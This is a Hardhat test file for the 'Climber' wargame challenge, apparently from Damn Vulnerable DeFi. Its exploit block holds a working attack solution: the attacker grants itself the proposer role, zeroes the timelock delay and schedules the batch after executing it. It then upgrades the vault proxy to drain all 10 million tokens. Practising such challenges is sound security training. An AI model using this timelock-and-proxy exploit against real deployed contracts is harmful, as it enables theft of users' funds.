const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */

        const Exploiter = await ethers.getContractFactory('ClimberExploiter')
        this.exploiter = await Exploiter.connect(attacker).deploy(this.timelock.address)

        const NewClimberVault = await ethers.getContractFactory('NewClimberVault')
        this.newClimberVault = await NewClimberVault.connect(attacker).deploy()

        let ABI = [ // functions to be called
            "function grantRole(bytes32 role, address account)", // ClimberTimelock
            "function updateDelay(uint64 newDelay)", // ClimberTimelock
            "function setSchedule()", // Exploiter
            "function upgradeToAndCall(address newImplementation, bytes data)", // ClimberVault
            "function sweepFunds()" // NewClimberVault
        ]

        let iface = new ethers.utils.Interface(ABI);
        let e1 = iface.encodeFunctionData("grantRole",[await this.timelock.PROPOSER_ROLE(),this.exploiter.address])
        let e2 = iface.encodeFunctionData("updateDelay",[0])
        let e3 = iface.encodeFunctionData("setSchedule")
        let IsweepFunds = iface.encodeFunctionData("sweepFunds")
        let e4 = iface.encodeFunctionData("upgradeToAndCall",[this.newClimberVault.address,IsweepFunds])

        let dataElements = [e1,e2,e3,e4]
        let targets = [this.timelock.address,this.timelock.address,this.exploiter.address,this.vault.address] // this.vault.address is the proxy address
        let values = [0,0,0,0]
        let salt = ethers.constants.HashZero
        
        await this.exploiter.connect(attacker).setValues(values,targets,dataElements)
        await this.timelock.connect(attacker).execute(targets,values,dataElements,salt)
        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
